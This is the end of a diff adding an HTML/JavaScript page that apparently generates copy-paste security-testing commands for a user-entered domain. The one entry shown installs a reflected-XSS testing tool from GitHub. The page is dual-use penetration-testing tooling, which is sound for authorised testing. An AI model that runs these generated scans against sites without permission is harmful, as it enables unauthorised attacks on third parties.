+            },
+            {
+                title: "Install XSSER",
+                description: "Reflected XSS testing tool",
+                command: "go install -v github.com/h6nt3r/xsser@latest"
+            }
+        ]
+    }
+];
+
+const sectionContainer = document.getElementById("command-sections");
+
+function renderSections() {
+    sectionContainer.innerHTML = "";
+    SECTIONS.forEach(section => {
+        const sectionEl = document.createElement("section");
+        sectionEl.className = "category";
+
+        const heading = document.createElement("h2");
+        heading.textContent = section.category;
+        sectionEl.appendChild(heading);
+
+        const grid = document.createElement("div");
+        grid.className = "tool-grid";
+
+        section.entries.forEach(entry => {
+            const article = document.createElement("article");
+            article.className = "tool";
+
+            const header = document.createElement("div");
+            header.className = "tool-header";
+            header.innerHTML = `<h3>${entry.title}</h3><p>${entry.description}</p>`;
+            article.appendChild(header);
+
+            const textarea = document.createElement("textarea");
+            textarea.className = "command-output";
+            textarea.readOnly = true;
+            textarea.setAttribute("data-template", entry.command);
+            article.appendChild(textarea);
+
+            const copyBtn = document.createElement("button");
+            copyBtn.className = "copy-btn";
+            copyBtn.type = "button";
+            copyBtn.textContent = "Copy";
+            copyBtn.addEventListener("click", () => {
+                navigator.clipboard.writeText(textarea.value).then(() => {
+                    copyBtn.textContent = "Copied!";
+                    setTimeout(() => (copyBtn.textContent = "Copy"), 1200);
+                });
+            });
+            article.appendChild(copyBtn);
+
+            grid.appendChild(article);
+        });
+
+        sectionEl.appendChild(grid);
+        sectionContainer.appendChild(sectionEl);
+    });
+}
+
+function updateCommands() {
+    const domainInput = document.getElementById("domain");
+    const urlInput = document.getElementById("url");
+    const domain = domainInput.value.trim() || "example.com";
+    const baseUrl = urlInput.value.trim() || `https://${domain}`;
+
+    document.querySelectorAll("[data-template]").forEach(el => {
+        const template = el.getAttribute("data-template") || "";
+        const wildcardDomain = domain.startsWith("*.") ? domain : `*.${domain}`;
+        const command = template
+            .replaceAll("{{domain}}", domain)
+            .replaceAll("{{url}}", baseUrl)
+            .replaceAll("{{wildcard}}", wildcardDomain);
+        if (el.tagName === "TEXTAREA") {
+            el.value = command;
+        } else {
+            el.textContent = command;
+        }
+    });
+}
+
+renderSections();
+updateCommands();
+
+document.getElementById("domain").addEventListener("input", updateCommands);
+document.getElementById("url").addEventListener("input", updateCommands);
+
+document.getElementById("scroll-up").addEventListener("click", () => {
+    window.scrollTo({ top: 0, behavior: "smooth" });
+});
+document.getElementById("scroll-down").addEventListener("click", () => {
+    document.getElementById("command-sections").scrollIntoView({ behavior: "smooth" });
+});
+</script>
+</body>
+</html>
+
